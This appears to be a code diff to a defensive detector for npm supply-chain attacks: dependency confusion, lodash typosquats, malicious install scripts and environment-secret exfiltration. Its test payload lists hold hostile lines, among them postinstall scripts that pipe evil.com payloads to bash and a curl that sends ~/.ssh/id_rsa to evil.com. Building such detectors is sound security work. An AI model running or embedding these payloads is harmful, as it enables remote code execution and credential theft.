@@ -26,10 +26,14 @@ const extractDependencyPairs = (input: string): Array<{ name: string; value: str
 
 const isLodashTyposquat = (pkg: string): boolean => {
     const base = pkg.split('/').pop() || ''
-    const candidate = base.toLowerCase().replace(/[^a-z]/g, '')
+    const lowerBase = base.toLowerCase()
+    const candidate = lowerBase
+        .toLowerCase()
+        .replace(/[10$5@]/g, (ch) => ({ '1': 'l', '0': 'o', '$': 's', '5': 's', '@': 'a' }[ch] || ch))
+        .replace(/[^a-z]/g, '')
 
     if (candidate.length === 0) return false
-    if (candidate === 'lodash') return false
+    if (candidate === 'lodash') return lowerBase !== 'lodash'
     if (candidate === 'typesnode') return false
 
     const target = 'lodash'
@@ -79,6 +83,15 @@ const hasDependencyOverrideUrl = (input: string): boolean => {
     return false
 }
 
+const hasInternalPackageConfusion = (input: string): boolean => {
+    if (!/"name"\s*:\s*"[^"]+"/i.test(input)) return false
+    const internalName = /"name"\s*:\s*"@?(?:internal|corp|company|private|my-company)[-/][^"]+"/i.test(input)
+    const npmPublicPublish =
+        /"publishConfig"\s*:\s*\{[\s\S]{0,180}"registry"\s*:\s*"https?:\/\/registry\.npmjs\.org/i.test(input) ||
+        /\bnpm\s+publish\b[\s\S]{0,120}--registry\s*=\s*(?:https?:\/\/)?registry\.npmjs\.org/i.test(input)
+    return internalName && npmPublicPublish
+}
+
 const hasScopedOverrideInstall = (input: string): boolean => {
     const scopedInstallRegex = /\bnpm\s+(?:i|install)\b[^'\n]*\s(@[^\s'"]+\/[^'"\s]+)[^'\n]*--registry\s*=\s*(?:https?:\/\/)?registry\.npmjs\.org/i
     return scopedInstallRegex.test(input)
@@ -121,6 +134,8 @@ export const dependencyConfusion: InvariantClassModule = {
         '{"dependencies":{"@my-company/internal-tool":"https://registry.npmjs.org/@my-company/internal-tool/-/internal-tool-1.2.3.tgz"}}',
         'npm install @corp/widget --registry=https://registry.npmjs.org',
         "import lotash from 'lotash'",
+        "import _ from '1odash'",
+        '{"name":"@internal/auth","version":"1.0.0","publishConfig":{"registry":"https://registry.npmjs.org"}}',
     ],
 
     knownBenign: [
@@ -131,7 +146,7 @@ export const dependencyConfusion: InvariantClassModule = {
 
     detect: (input: string): boolean => {
         const d = deepDecode(input)
-        return hasDependencyOverrideUrl(d) || hasScopedOverrideInstall(d) || hasLodashTyposquat(d)
+        return hasDependencyOverrideUrl(d) || hasInternalPackageConfusion(d) || hasScopedOverrideInstall(d) || hasLodashTyposquat(d)
     },
 
     detectL2: l2DependencyConfusion,
@@ -158,6 +173,7 @@ const hasMaliciousLifecycleScript = (input: string): boolean => {
         const raw = body.toLowerCase()
 
         if (/\b(?:curl|wget)\b[^"\n|]*\|\s*(?:sh|bash)\b/.test(raw)) return true
+        if (/\b(?:curl|wget)\b[^"\n|]*(?:evil|attacker|malware|payload)[^"\n|]*\|\s*(?:sh|bash)\b/.test(raw)) return true
         if (/\bnode\s+-e\b/.test(raw) && /\beval\b/.test(raw)) return true
         if (/\b(eval|sh\s+-c|bash\s+-c)\b/.test(raw) &&
             /(?:\$\(|`[^`]+`|\\x[0-9a-f]{2}|base64)/i.test(raw)) {
@@ -180,6 +196,7 @@ export const postinstallInjection: InvariantClassModule = {
 
     knownPayloads: [
         '{"scripts":{"postinstall":"curl -sSL https://evil.example/payload.sh | sh"}}',
+        '{"scripts":{"postinstall":"curl https://evil.com/payload.sh | bash"}}',
         '{"scripts":{"preinstall":"node -e \\"eval(process.env.CONTACT)\\""}}',
         '{"scripts":{"postinstall":"sh -c eval `printf %s payload`"}}',
     ],
@@ -214,6 +231,14 @@ const hasEnvExfiltration = (input: string): boolean => {
     const lines = input.split(/[\n;\r]+/)
 
     return lines.some((line) => {
+        if (
+            /\b(?:curl|wget)\b/i.test(line) &&
+            /(?:\$(?:HOME|USERPROFILE)|~)\/\.ssh\/id_rsa|\$[A-Z_][A-Z0-9_]*|\bprocess\.env\.[A-Z_][A-Z0-9_]*\b/i.test(line) &&
+            /\b(?:https?:\/\/|[a-z0-9.-]+\.[a-z]{2,}\/?)/i.test(line)
+        ) {
+            return true
+        }
+
         const hasProcessEnv = /\bprocess\.env\b/.test(line)
         const hasPythonEnv = /\bos\.environ\b/.test(line)
         if (!hasProcessEnv && !hasPythonEnv) return false
@@ -242,6 +267,7 @@ export const envExfiltration: InvariantClassModule = {
         'fetch("https://exfil.example/collect", {method:"POST", body: JSON.stringify({token: process.env.API_TOKEN})})',
         "requests.post('https://api.example/collect', data=os.environ)",
         'await fetch(`https://exfil/${process.env.BUILD_TOKEN}`, { method: "POST", body: process.env })',
+        'curl $HOME/.ssh/id_rsa evil.com',
     ],
 
     knownBenign: [
